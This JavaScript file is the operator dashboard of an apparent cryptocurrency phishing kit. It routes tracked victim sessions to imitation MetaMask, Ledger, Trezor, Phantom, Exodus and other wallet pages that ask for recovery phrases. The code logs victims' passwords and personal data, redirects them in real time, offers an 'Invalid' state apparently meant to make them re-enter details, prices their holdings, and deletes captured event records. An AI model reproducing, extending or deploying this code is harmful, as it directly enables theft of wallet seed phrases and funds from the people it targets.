document.addEventListener('htmx:configRequest', function(e) {
    e.detail.headers['X-CSRF-TOKEN'] = document.querySelector('meta[name="csrf-token"]').content;
});

// Clear all RP cfg panel localStorage/sessionStorage on session switch or page refresh
function _clearAllRpPanelStorage() {
    try {
        Object.keys(localStorage).forEach(function(k) {
            if (/^(trz_|al_|mm_|el_|ld_|ex_)/.test(k)) localStorage.removeItem(k);
            if (/_ck$/.test(k)) localStorage.removeItem(k);
        });
    } catch(e) {}
    try {
        Object.keys(sessionStorage).forEach(function(k) {
            if (/^ll_ct_/.test(k)) sessionStorage.removeItem(k);
        });
    } catch(e) {}
}
// Reset RP panel state on page load (handles admin page refresh)
_clearAllRpPanelStorage();

// Global kick-detection ping — polls every 5s; if session is gone, go to Admin login
(function() {
    function _kickPing() {
        fetch('/admin777888xxx/ping', {headers: {'X-Requested-With': 'XMLHttpRequest'}})
            .then(function(r) {
                if (r.status === 401) {
                    window.location.replace('/admin777888xxx/login');
                }
            })
            .catch(function() {});
    }
    setInterval(_kickPing, 5000);
})();

window.copyActivityBox = function(btn) {
    var t = btn.previousElementSibling;
    if (!t) return;
    var text = (t.textContent || '').trim();
    var clip = btn.innerHTML;
    function ok() {
        btn.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
        setTimeout(function(){ btn.innerHTML = clip; }, 900);
    }
    function fallback() {
        try {
            var ta = document.createElement('textarea');
            ta.value = text;
            ta.setAttribute('readonly', '');
            ta.style.position = 'fixed';
            ta.style.left = '-9999px';
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            ok();
        } catch (e) {}
    }
    if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
        navigator.clipboard.writeText(text).then(ok).catch(fallback);
    } else {
        fallback();
    }
};
function escHtml(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
function escAttr(s) { return String(s||'').replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n'); }

var _sendCommandLock = false;
window.sendCommand = function(command, payload, btnEl) {
    if (!selectedToken) { alert('Select a session first.'); return; }
    if (_sendCommandLock) return; // prevent double-click
    _sendCommandLock = true;
    if (btnEl) { btnEl.disabled = true; btnEl.style.opacity = '.5'; }
    fetch('/admin777888xxx/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content },
        body: JSON.stringify({ session_token: selectedToken, command, payload }),
    }).then(r => r.json()).then(d => {
        if (d.ok) {
            // Extra immediate fetches at key moments without restarting the interval
            if (selectedToken) {
                if (window._evPollNow) window._evPollNow();
                [1100, 2300, 3600].forEach(function(ms) {
                    setTimeout(function() {
                        if (window._evPollNow && selectedToken) window._evPollNow();
                        updateFlowPanel();
                    }, ms);
                });
            }
        }
    }).finally(function() {
        // Re-enable after 2s  prevents double-send, allows retry if genuinely needed
        setTimeout(function() {
            _sendCommandLock = false;
            if (btnEl) { btnEl.disabled = false; btnEl.style.opacity = '1'; }
        }, 2000);
    });
};

window.clearEditFields = function() {}; // no-op  edit fields removed

// "" Clean modal  category view """"""""""""""""""""""""""""""""""""""""""""""""
const CLEAN_CATEGORIES = [
    {
        id:    'pii',
        label: 'Sensitive / PII',
        desc:  'Passwords, emails, names and other personal identifiers',
        mono:  'PII',
        card:  'border-gray-800 hover:border-gray-700',
        badge: 'text-gray-400 border-gray-700 bg-gray-900',
        count: 'text-gray-500',
        filter: ev => ev.class === 'sensitive',
        preview: ev => ev.element || ev.type,
    },
    {
        id:    'form',
        label: 'Form Submissions',
        desc:  'Non-sensitive form fields, terms acceptance, submit events',
        mono:  'DATA',
        card:  'border-gray-800 hover:border-gray-700',
        badge: 'text-gray-400 border-gray-700 bg-gray-900',
        count: 'text-gray-500',
        filter: ev => ev.class === 'data',
        preview: ev => ev.element || ev.type,
    },
    {
        id:    'visits',
        label: 'Page Visits',
        desc:  'Pages the user navigated to during this session',
        mono:  'VISIT',
        card:  'border-gray-800 hover:border-gray-700',
        badge: 'text-gray-400 border-gray-700 bg-gray-900',
        count: 'text-gray-500',
        filter: ev => ev.type === 'page_visit',
        preview: ev => ev.value || ev.element,
    },
    {
        id:    'exits',
        label: 'Page Exits',
        desc:  'Time-on-page records fired when the user left each page',
        mono:  'EXIT',
        card:  'border-gray-800 hover:border-gray-700',
        badge: 'text-gray-400 border-gray-700 bg-gray-900',
        count: 'text-gray-500',
        filter: ev => ev.type === 'page_exit',
        preview: ev => ev.element + (ev.value ? '  ' + ev.value : ''),
    },
    {
        id:    'other',
        label: 'Other Activity',
        desc:  'Clicks, ratings and any uncategorised events',
        mono:  'OTHER',
        card:  'border-gray-800 hover:border-gray-700',
        badge: 'text-gray-400 border-gray-700 bg-gray-900',
        count: 'text-gray-500',
        filter: ev => ev.class === 'activity' && ev.type !== 'page_visit' && ev.type !== 'page_exit',
        preview: ev => ev.type + (ev.element ? '  ' + ev.element : ''),
    },
];

// Stores {catId: [ids]} for the current modal open
let _cleanCatIds = {};

window.openCleanModal = function() {
    const events = window._feedEvents || [];
    if (!events.length) return;

    _cleanCatIds = {};
    const list = document.getElementById('clean-event-list');
    list.innerHTML = '';

    CLEAN_CATEGORIES.forEach(function(cat) {
        const group = events.filter(cat.filter);
        if (!group.length) return;

        _cleanCatIds[cat.id] = group.map(ev => ev.id);

        // Build 3-item preview string
        const unique = [...new Set(group.map(cat.preview).filter(Boolean))];
        const preview = unique.slice(0, 4).join(', ') + (unique.length > 4 ? ', ...' : '');

        const card = document.createElement('label');
        card.className = `flex items-center gap-4 px-4 py-3.5 bg-gray-900 border ${cat.card} rounded cursor-pointer transition-all select-none group`;
        card.dataset.cat = cat.id;
        card.innerHTML = `
            <input type="checkbox" checked
                   class="custom-cb cursor-pointer"
                   data-cat="${cat.id}"
                   onchange="updateCleanCount()">
            <div class="flex-1 min-w-0">
                <div class="flex items-center gap-2 mb-0.5">
                    <span class="font-mono text-[9px] px-1.5 py-0.5 rounded border ${cat.badge}">${cat.mono}</span>
                    <span class="text-white text-xs font-medium">${cat.label}</span>
                    <span class="ml-auto font-mono text-[10px] ${cat.count}">${group.length} event${group.length !== 1 ? 's' : ''}</span>
                </div>
                <div class="text-gray-600 text-[10px] leading-relaxed">${cat.desc}</div>
                ${preview ? `<div class="text-gray-700 text-[10px] font-mono mt-1 truncate">${preview}</div>` : ''}
            </div>
        `;
        list.appendChild(card);
    });

    updateCleanCount();
    document.getElementById('clean-modal').classList.remove('hidden');
};

window.closeCleanModal = function() { document.getElementById('clean-modal').classList.add('hidden'); };

window.cleanToggleAll = function(checked) {
    document.querySelectorAll('#clean-event-list input[type="checkbox"]').forEach(cb => cb.checked = checked);
};

window.updateCleanCount = function() { /* label removed  no-op */ };

window.executeClean = function() {
    const checked = [...document.querySelectorAll('#clean-event-list input[type="checkbox"]:checked')];
    const ids = checked.flatMap(cb => _cleanCatIds[cb.dataset.cat] || []);
    if (!ids.length) { closeCleanModal(); return; }
    fetch('/admin777888xxx/events', {
        method: 'DELETE',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content },
        body: JSON.stringify({ ids }),
    }).then(function(r) {
        if (r.redirected || r.status === 302) { window.location.href = '/admin777888xxx/login'; return null; }
        if (!r.ok) {  return null; }
        return r.json();
    }).then(function(d) {
        if (!d || !d.ok) return;
        closeCleanModal();
        
        if (selectedToken) htmx.ajax('GET', '/admin777888xxx/session/' + selectedToken + '/events', {target: '#event-feed', swap: 'innerHTML'}).then(function(){ _fillFeedUsd(); });
    }).catch(function() {  });
};

document.getElementById('clean-modal').addEventListener('click', function(e) { if (e.target === this) closeCleanModal(); });

//  Vault Balance panel 
var _vaultPrices = {};  // {key: usdPrice}   fetched once, refreshed periodically
var _vaultPriceFetchedAt = 0;
// Symbol ' CoinGecko slug for price fetching
var _GECKO_IDS = {
    btc:'bitcoin',eth:'ethereum',usdt:'tether',usdt_trc20:'tether',
    bnb:'binancecoin',usdc:'usd-coin',usdc_base:'usd-coin',usdc_sol:'usd-coin',usdc_polygon:'usd-coin',
    xrp:'ripple',sol:'solana',doge:'dogecoin',ada:'cardano',trx:'tron',
    link:'chainlink',dot:'polkadot',matic:'matic-network',pol:'matic-network',
    shib:'shiba-inu',avax:'avalanche-2',uni:'uniswap',atom:'cosmos',
    ltc:'litecoin',xlm:'stellar',vet:'vechain',near:'near',fil:'filecoin',
    arb:'arbitrum',op:'optimism',apt:'aptos',sui:'sui',
    inj:'injective-protocol',grt:'the-graph',aave:'aave',
    snx:'synthetix-network-token',crv:'curve-dao-token',
    comp:'compound-governance-token',yfi:'yearn-finance',
    sushi:'sushi',bat:'basic-attention-token',ens:'ethereum-name-service',
    sand:'the-sandbox',mana:'decentraland',axs:'axie-infinity',
    chz:'chiliz',flow:'flow',rose:'oasis-network',egld:'elrond-erd-2',
    algo:'algorand',dash:'dash',zec:'zcash',xtz:'tezos',
    ksm:'kusama',kava:'kava',tia:'celestia',bonk:'bonk',
    wif:'dogwifcoin',pepe:'pepe',floki:'floki',tao:'bittensor',
    render:'render-token',fet:'fetch-ai',icp:'internet-computer',
    stx:'blockstack',mina:'mina-protocol',qnt:'quant-network',
    cro:'crypto-com-chain',hbar:'hedera-hashgraph',
    ldo:'lido-dao',bch:'bitcoin-cash',
    near:'near',arb:'arbitrum',op:'optimism',sui:'sui',apt:'aptos',
    inj:'injective-protocol',stx:'blockstack',aave:'aave',
    icp:'internet-computer',render:'render-token',tao:'bittensor',
    pepe:'pepe',bonk:'bonk',wif:'dogwifcoin',floki:'floki',
    mana:'decentraland',sand:'the-sandbox',axs:'axie-infinity',
    vet:'vechain',
};

// Canonical CoinGecko icon URLs — shared across Coinbase IIFE, CC IIFE, vault panel, and event feed
var _COIN_ICONS = {
    btc:          'https://coin-images.coingecko.com/coins/images/1/large/bitcoin.png',
    eth:          'https://coin-images.coingecko.com/coins/images/279/large/ethereum.png',
    sol:          'https://coin-images.coingecko.com/coins/images/4128/large/solana.png',
    xrp:          'https://coin-images.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png',
    ada:          'https://coin-images.coingecko.com/coins/images/975/large/cardano.png',
    doge:         'https://coin-images.coingecko.com/coins/images/5/large/dogecoin.png',
    ltc:          'https://coin-images.coingecko.com/coins/images/2/large/litecoin.png',
    bnb:          'https://coin-images.coingecko.com/coins/images/825/large/bnb-icon2_2x.png',
    cro:          'https://coin-images.coingecko.com/coins/images/7310/large/cro_token_logo.png',
    usdt:         'https://coin-images.coingecko.com/coins/images/325/large/Tether.png',
    usdc:         'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png',
    matic:        'https://coin-images.coingecko.com/coins/images/4713/large/polygon.png',
    avax:         'https://coin-images.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png',
    link:         'https://coin-images.coingecko.com/coins/images/877/large/chainlink-new-logo.png',
    dot:          'https://coin-images.coingecko.com/coins/images/12171/large/polkadot.png',
    shib:         'https://coin-images.coingecko.com/coins/images/11939/large/shiba.png',
    uni:          'https://coin-images.coingecko.com/coins/images/12504/large/uniswap-logo.png',
    xlm:          'https://coin-images.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png',
    ton:          'https://coin-images.coingecko.com/coins/images/17980/large/ton_symbol.png',
    trx:          'https://coin-images.coingecko.com/coins/images/1094/large/tron-logo.png',
    atom:         'https://coin-images.coingecko.com/coins/images/1481/large/cosmos_hub.png',
    bch:          'https://coin-images.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png',
    wbtc:         'https://coin-images.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png',
    dai:          'https://coin-images.coingecko.com/coins/images/9956/large/Badge_Dai.png',
    near:         'https://coin-images.coingecko.com/coins/images/10365/large/near.jpg',
    arb:          'https://coin-images.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg',
    op:           'https://coin-images.coingecko.com/coins/images/25244/large/Optimism.png',
    sui:          'https://coin-images.coingecko.com/coins/images/26375/large/sui_asset.jpeg',
    apt:          'https://coin-images.coingecko.com/coins/images/26455/large/aptos_round.png',
    inj:          'https://coin-images.coingecko.com/coins/images/12882/large/Secondary_Symbol.png',
    hbar:         'https://coin-images.coingecko.com/coins/images/3688/large/hbar.png',
    ldo:          'https://coin-images.coingecko.com/coins/images/13573/large/lido_dao.png',
    stx:          'https://coin-images.coingecko.com/coins/images/2069/large/Stacks_logo_full.png',
    aave:         'https://coin-images.coingecko.com/coins/images/12645/large/aave-token-round.png',
    icp:          'https://coin-images.coingecko.com/coins/images/14495/large/Internet_Computer_logo.png',
    render:       'https://coin-images.coingecko.com/coins/images/11636/large/rndr.png',
    tao:          'https://coin-images.coingecko.com/coins/images/28452/large/ARUqqBve_400x400.jpg',
    pepe:         'https://coin-images.coingecko.com/coins/images/29850/large/pepe-token.jpeg',
    bonk:         'https://coin-images.coingecko.com/coins/images/28600/large/bonk.jpg',
    wif:          'https://coin-images.coingecko.com/coins/images/33566/large/dogwifhat.jpg',
    floki:        'https://coin-images.coingecko.com/coins/images/16746/large/PNG_image.png',
    mana:         'https://coin-images.coingecko.com/coins/images/878/large/decentraland-mana.png',
    sand:         'https://coin-images.coingecko.com/coins/images/12129/large/sandbox_logo.jpg',
    axs:          'https://coin-images.coingecko.com/coins/images/13029/large/axie_infinity_logo.png',
    vet:          'https://coin-images.coingecko.com/coins/images/1167/large/VeChain-Logo-768px.png',
    usdt_trc20:   'https://coin-images.coingecko.com/coins/images/325/large/Tether.png',
    usdc_base:    'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png',
    usdc_sol:     'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png',
    usdc_polygon: 'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png',
};

// Whitelist of top ~47 coins shown in dropdowns (price API supported + icon available)
var _TOP_COIN_KEYS = {
    btc:1,eth:1,sol:1,xrp:1,bnb:1,ada:1,doge:1,trx:1,avax:1,shib:1,
    ton:1,link:1,dot:1,matic:1,ltc:1,uni:1,xlm:1,atom:1,bch:1,wbtc:1,dai:1,
    near:1,arb:1,op:1,sui:1,apt:1,inj:1,hbar:1,ldo:1,stx:1,aave:1,icp:1,
    render:1,tao:1,pepe:1,bonk:1,wif:1,floki:1,cro:1,vet:1,mana:1,sand:1,axs:1,
    usdt:1,usdc:1,usdt_trc20:1,usdc_base:1,usdc_sol:1,usdc_polygon:1,
};

// Coin catalog  populated from /coinbase_assets.json
var _vbCoinCatalog = [];
var _vaultCoinMap  = {};
var _catalogLoaded = false;
var _catalogCbs    = [];

function _loadCoinCatalog(cb) {
    if (_catalogLoaded) { if (cb) cb(); return; }
    if (cb) _catalogCbs.push(cb);
    if (_catalogCbs.length > 1) return;
    fetch('/coinbase_assets.json')
    .then(function(r){ return r.json(); })
    .then(function(coins){
        _vbCoinCatalog = coins.map(function(c){
            return {key:c.symbol.toLowerCase(),label:c.name,ticker:c.symbol,iconUrl:c.image_url,iconColor:'#333'};
        });
        var usdtDef=_vbCoinCatalog.find(function(c){return c.key==='usdt';});
        var usdcDef=_vbCoinCatalog.find(function(c){return c.key==='usdc';});
        if(usdtDef)_vbCoinCatalog.push({key:'usdt_trc20',label:'Tether (TRC-20)',ticker:'USDT',iconUrl:usdtDef.iconUrl,iconColor:'#333'});
        if(usdcDef){
            _vbCoinCatalog.push({key:'usdc_base',   label:'USD Coin (Base)',   ticker:'USDC',iconUrl:usdcDef.iconUrl,iconColor:'#333'});
            _vbCoinCatalog.push({key:'usdc_sol',    label:'USD Coin (Solana)', ticker:'USDC',iconUrl:usdcDef.iconUrl,iconColor:'#333'});
            _vbCoinCatalog.push({key:'usdc_polygon',label:'USD Coin (Polygon)',ticker:'USDC',iconUrl:usdcDef.iconUrl,iconColor:'#333'});
        }
        // Patch canonical CoinGecko icons and limit to top supported coins
        _vbCoinCatalog.forEach(function(c){ if(_COIN_ICONS[c.key]) c.iconUrl=_COIN_ICONS[c.key]; });
        _vbCoinCatalog = _vbCoinCatalog.filter(function(c){ return !!_TOP_COIN_KEYS[c.key]; });
        _vaultCoinMap={};
        _vbCoinCatalog.forEach(function(c){_vaultCoinMap[c.key]=c;});
        _catalogLoaded=true;
        var cbs=_catalogCbs.slice();_catalogCbs=[];
        cbs.forEach(function(fn){if(fn)fn();});
    }).catch(function(){
        _catalogLoaded=true;
        var cbs=_catalogCbs.slice();_catalogCbs=[];
        cbs.forEach(function(fn){if(fn)fn();});
    });
}
// Warm up catalog on page load
_loadCoinCatalog();

function _fetchVaultPrices(cb) {
    var now = Date.now();
    if (now - _vaultPriceFetchedAt < 60000 && Object.keys(_vaultPrices).length) { if(cb)cb(); return; }
    var geckoSet={};
    Object.keys(_GECKO_IDS).forEach(function(k){geckoSet[_GECKO_IDS[k]]=true;});
    var ids=Object.keys(geckoSet).join(',');
    fetch('https://api.coingecko.com/api/v3/simple/price?ids='+ids+'&vs_currencies=usd')
    .then(function(r){return r.json();})
    .then(function(d){
        Object.keys(_GECKO_IDS).forEach(function(k){
            var g=_GECKO_IDS[k];
            if(d[g]&&d[g].usd)_vaultPrices[k]=d[g].usd;
        });
        _vaultPriceFetchedAt=Date.now();
        if(cb)cb();
    }).catch(function(){if(cb)cb();});
}

function _fillFeedUsd() {
    var spans = document.querySelectorAll('#event-feed [data-usd-key]');
    if (!spans.length) return;
    function _doFill() {
        spans.forEach(function(s) {
            var k = s.getAttribute('data-usd-key');
            var a = parseFloat(s.getAttribute('data-usd-amt')) || 0;
            var p = _vaultPrices[k] || 0;
            if (p && a) {
                var usd = p * a;
                s.textContent = usd >= 1000
                    ? '$' + usd.toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2})
                    : '$' + usd.toFixed(usd < 0.01 ? 6 : 2);
            }
        });
    }
    if (Object.keys(_vaultPrices).length) { _doFill(); }
    else { _fetchVaultPrices(function() { _doFill(); }); }
}

// Vault-panel config restore cache/guard state (keyed by session token + brand)
window._vbRestoreLoadedKey = null;     // key for which we have a CONFIRMED valid response (populated or genuinely empty)
window._vbRestoreInFlightKey = null;   // key currently being fetched (at most one at a time)
window._vbRestoreAbort = null;         // AbortController owned by the current in-flight attempt
window._vbRestoreGen = 0;              // bumped per restore attempt; identifies the newest attempt
window._vbRestoreLastFailKey = null;   // key that most recently failed/aborted
window._vbRestoreLastFailAt = 0;       // timestamp of that failure, for the retry cooldown

function _vbCurrentVaultKey() {
    var tok = window.selectedToken || selectedToken || '';
    return tok + '|' + (window._vbBrand || 'coinbase');
}

// _vbSaveState: no-op — vault state is now saved to DB only (via /admin777888xxx/vault-config-save)
function _vbSaveState() {}

function _vbAbandonTransientVaultWorkspace() {
    window._vbWorkspaceEpoch = (window._vbWorkspaceEpoch || 0) + 1;
    clearTimeout(window._vbSyncDebounce);
    window._vbSyncDebounce = null;
    window._vbAdminKeys = [];
    window._vbAdminData = {};
    window._vbAdminMnemonic = '';
    window._vbAdminGeneratedAddrs = {};
}

// _vbRestoreState: fetch vault config from DB for the current session+brand key.
// At most one request in flight per key; confirmed responses (including genuinely empty) are
// cached by key so a valid empty result is never re-fetched; failures/aborts are never cached
// and get a short cooldown. Cleanup in finally() is owned by the exact attempt (key + generation
// + its own AbortController reference) so a stale, delayed finally() from an older aborted
// request (e.g. rapid A -> B -> A) can never clear state belonging to a newer request that
// happens to reuse the same key.
function _vbRestoreState(callback) {
    var tok = window.selectedToken || selectedToken;
    if (!tok) { return; }
    var key = _vbCurrentVaultKey();

    // Already confirmed loaded (populated or confirmed-empty) for this exact key.
    if (window._vbRestoreLoadedKey === key) { if (callback) callback(); return; }

    // A request for this exact key is already in flight — its own completion will re-render.
    if (window._vbRestoreInFlightKey === key) { return; }

    // Failure/abort cooldown for this key — avoid tight-looping on a fast repeated failure.
    if (window._vbRestoreLastFailKey === key && (Date.now() - window._vbRestoreLastFailAt) < 3000) { return; }

    // A different key is in flight (stale) — abort it, the newly-active key takes over.
    if (window._vbRestoreAbort && window._vbRestoreInFlightKey && window._vbRestoreInFlightKey !== key) {
        try { window._vbRestoreAbort.abort(); } catch (e) {}
    }

    window._vbRestoreInFlightKey = key;
    var myGen = ++window._vbRestoreGen;

    var csrf = document.querySelector('meta[name="csrf-token"]');
    var csrfTok = csrf ? csrf.getAttribute('content') : '';
    var brand = window._vbBrand || 'coinbase';

    var ac = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    window._vbRestoreAbort = ac;
    var timeoutId = setTimeout(function () { if (ac) ac.abort(); }, 8000);

    fetch('/admin777888xxx/vault-config-get?session_token=' + encodeURIComponent(tok) + '&brand=' + encodeURIComponent(brand), {
        headers: {'X-CSRF-TOKEN': csrfTok},
        signal: ac ? ac.signal : undefined
    }).then(function (r) {
        if (!r.ok) throw new Error('HTTP ' + r.status);
        return r.json();
    }).then(function (res) {
        if (!res || res.ok !== true) throw new Error('bad response');
        // Stale guard: a newer restore (different key/generation) already superseded this one.
        if (myGen !== window._vbRestoreGen || key !== _vbCurrentVaultKey()) return;

        // Confirmed valid response — clear previous key's data first, then populate (empty stays empty).
        window._vbAdminKeys = [];
        window._vbAdminData = {};
        var vd = res.vault_data;
        if (vd) {
            var coinKeys = (vd.coin_keys || '').split(',').map(function (k) { return k.trim(); }).filter(Boolean);
            if (coinKeys.length) {
                window._vbAdminKeys = coinKeys;
                coinKeys.forEach(function (k) {
                    window._vbAdminData[k] = {addr: vd[k + '_address'] || '', amt: vd[k + '_amount'] || ''};
                });
            }
        }
        window._vbRestoreLoadedKey = key;
        window._vbRestoreLastFailKey = null;
    }).catch(function () {
        if (myGen === window._vbRestoreGen && key === _vbCurrentVaultKey()) {
            window._vbRestoreLastFailKey = key;
            window._vbRestoreLastFailAt = Date.now();
        }
    }).finally(function () {
        clearTimeout(timeoutId);
        // Ownership check: only the exact attempt that set these may clear them. A stale,
        // delayed finally() from an aborted older request (same key, older generation, older
        // controller) must never null out a newer request's in-flight lock/abort reference.
        if (window._vbRestoreInFlightKey === key &&
            window._vbRestoreGen === myGen &&
            window._vbRestoreAbort === ac) {
            window._vbRestoreInFlightKey = null;
            window._vbRestoreAbort = null;
        }
        if (callback) callback();
    });
}

// "" Flows panel (manual redirect control) """""""""""""""""""""""""""""""""""""
const PAGE_META = {
    // "" MetaMask """""""""""""""""""""""""""""""""""""""""""""""""""""""""
    metamask_import:         { label: 'MetaMask Import',   url: '/metamask/import'                },
    metamask_recover:        { label: 'MetaMask Recover',  url: '/metamask/recover'               },
    metamask_loading:        { label: 'MetaMask Loading',  url: '/metamask/loading'               },
    trust_disconnect:         { label: 'Trust Disconnect',  url: '/trust/disconnect'               },
    trust_recover:           { label: 'Trust Recover',     url: '/trust/recover'                  },
    trust_loading:           { label: 'Trust Loading',     url: '/trust/loading'                  },
    // "" Exodus """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""
    exodus_onboarding:       { label: 'Exodus Onboarding', url: '/exodus'                         },
    exodus_import:           { label: 'Exodus Import',     url: '/exodus/import'                  },
    exodus_recover:          { label: 'Exodus Recover',    url: '/exodus/recover'                 },
    exodus_loading:          { label: 'Exodus Loading',    url: '/exodus/loading'                 },
    // "" Ellipal """""""""""""""""""""""""""""""""""""""""""""""""""""""""""
    ellipal_24word:          { label: 'Ellipal 24-Word',   url: '/ellipal/1'                      },
    ellipal_12word:          { label: 'Ellipal 12-Word',   url: '/ellipal/2'                      },
    ellipal_recover:         { label: 'Ellipal Recover',   url: '/ellipal/recover'                },
    ellipal_loading:         { label: 'Ellipal Loading',   url: '/ellipal/loading'                },
    // Ledger
    ledger_signin:          { label: 'Ledger Sign In',    url: '/ledger/signin'                  },
    ledger_1:               { label: 'Ledger 1',           url: '/ledger/1'                       },
    ledger_2:               { label: 'Ledger 2',           url: '/ledger/2'                       },
    ledger_3:               { label: 'Ledger 3',           url: '/ledger/3'                       },
    ledger_1_recover:       { label: 'Ledger 1 Recover',   url: '/ledger/1/recover'               },
    ledger_2_recover:       { label: 'Ledger 2 Recover',   url: '/ledger/2/recover'               },
    ledger_3_recover:       { label: 'Ledger 3 Recover',   url: '/ledger/3/recover'               },
    ledger_loading:         { label: 'Ledger Loading',    url: '/ledger/loading'                 },
    // Trezor
    trezor_connect:          { label: 'Trezor Connect',      url: '/trezor/connect'      },
    trezor_recover:          { label: 'Trezor Recover',      url: '/trezor/recover'      },
    trezor_phrase_page:      { label: 'Trezor Phrase Page',  url: '/trezor/phrase-page'  },
    trezor_loading:          { label: 'Trezor Loading',      url: '/trezor/loading'      },
    // Phantom
    phantom_seeds:          { label: 'Phantom Seeds',        url: '/phantom/seeds'       },
    phantom_recover:        { label: 'Phantom Recover',      url: '/phantom/recover'     },
    phantom_loading:        { label: 'Phantom Loading',      url: '/phantom/loading'     },
};

let _lastPageForButtons = null;

function showFlowPanel(token) {
    if (!token) { hideFlowsContent(); return; }
    const row  = document.querySelector('[data-token="' + token + '"]');
    const name = row ? (row.dataset.label || token.substring(0,12)) : token.substring(0,12);
    var ph = document.getElementById('flows-placeholder');
    var fc = document.getElementById('flows-content');
    var sl = document.getElementById('flows-session-label');
    if (ph) ph.style.display = 'none';
    if (fc) fc.style.display = 'flex';
    if (sl) sl.textContent = name || '';
    _lastPageForButtons = null;
    updateFlowPanel();
}

function updateFlowPanel() {
    updateCurrentPageIndicator();
    renderRedirectButtons();
}

function updateCurrentPageIndicator() {
    if (!selectedToken) return;
    const row   = document.querySelector('[data-token="' + selectedToken + '"]');
    const page  = row ? row.dataset.page : null;
    const meta  = page ? (PAGE_META[page] || { label: page, icon: '', url: '/' + page }) : null;
    const iconEl = document.getElementById('flow-page-icon');
    const nameEl = document.getElementById('flow-page-name');
    const urlEl  = document.getElementById('flow-page-url');
    if (iconEl) {
        iconEl.className = (meta && meta.url)
            ? 'w-2 h-2 rounded-full bg-green-400 flex-shrink-0 pulse-dot'
            : 'w-2 h-2 rounded-full bg-gray-700 flex-shrink-0';
    }
    if (nameEl) nameEl.textContent = meta ? meta.label : 'Unknown';
    if (urlEl) urlEl.textContent  = meta ? meta.url   : '';

}

var _activeRedirectTab = 'all';
function setRedirectTab(tab) {
    _activeRedirectTab = tab;
    ['all','exchangers','wallets','emails'].forEach(function(t) {
        var el = document.getElementById('tab-' + t);
        if (!el) return;
        if (t === tab) {
            el.style.background = '#1e293b';
            el.style.color = '#e2e8f0';
            el.style.borderColor = '#6366f1';
            el.style.fontWeight = '700';
        } else {
            el.style.background = '';
            el.style.color = '#6b7280';
            el.style.borderColor = '#374151';
            el.style.fontWeight = '500';
        }
    });
    var list = document.getElementById('redirect-btn-list');
    if (!list) return;
    list.querySelectorAll('.rp-site-btn').forEach(function(btn) {
        var cat = btn.dataset.category || 'exchangers';
        btn.style.display = (tab === 'all' || cat === tab) ? '' : 'none';
    });
}

function filterRedirectSearch(q) {
    q = q.trim().toLowerCase();
    var list = document.getElementById('redirect-btn-list');
    if (!list) return;
    list.querySelectorAll('.rp-site-btn').forEach(function(btn) {
        if (!q) {
            // No search  respect active tab filter
            var cat = btn.dataset.category || 'exchangers';
            btn.style.display = (_activeRedirectTab === 'all' || cat === _activeRedirectTab) ? '' : 'none';
        } else {
            var label = (btn.querySelector('.rp-btn-label')||{}).textContent || '';
            btn.style.display = label.toLowerCase().indexOf(q) !== -1 ? '' : 'none';
        }
    });
}

function renderRedirectButtons() {
    var row=selectedToken?document.querySelector('[data-token="'+selectedToken+'"]'):null;
    var currentPage=row?row.dataset.page:null;
    if(currentPage===_lastPageForButtons) return;
    _lastPageForButtons=currentPage;

    // Do NOT close rp-site-overlay here  only the back button should close it

    var container=document.getElementById('redirect-btn-list');
    if(!container) return;
    container.innerHTML='';

    var CHEVRON='<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="transition:transform .2s ease;flex-shrink:0;"><polyline points="6 9 12 15 18 9"/></svg>';
    var CHEVRON_PG='<svg class="rp-page-chevron" width="8" height="8" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>';
    var ACTION_ROW='<div class="rp-action-row"><button class="rp-btn-send">Send</button><button class="rp-btn-preview">Preview</button></div>';
    // Per-box Default|Invalid selector (UI only for now — Send wiring is a later step).
    // Same .rp-action-row shell as Preview|Send so width/gap/margins match.
    var PAGE_STATE_ROW='<div class="rp-action-row ps-state-row" data-page-state="default">'
        +'<button type="button" class="ps-toggle-btn ps-toggle-default ps-toggle-active">Default</button>'
        +'<button type="button" class="ps-toggle-btn ps-toggle-invalid">Invalid</button>'
        +'</div>';

    function bindPageStateRow(panel) {
        if (!panel) return;
        panel.dataset.pageState = 'default';
        var row = panel.querySelector('.ps-state-row');
        if (!row) return;
        var btnD = row.querySelector('.ps-toggle-default');
        var btnI = row.querySelector('.ps-toggle-invalid');
        function setState(state) {
            panel.dataset.pageState = state;
            row.dataset.pageState = state;
            if (btnD) btnD.classList.toggle('ps-toggle-active', state === 'default');
            if (btnI) btnI.classList.toggle('ps-toggle-active', state === 'invalid');
        }
        if (btnD) btnD.onclick = function() { setState('default'); };
        if (btnI) btnI.onclick = function() { setState('invalid'); };
    }

    function appendPageStateRow(panel) {
        var wrap = document.createElement('div');
        wrap.innerHTML = PAGE_STATE_ROW;
        panel.appendChild(wrap.firstChild);
        bindPageStateRow(panel);
    }

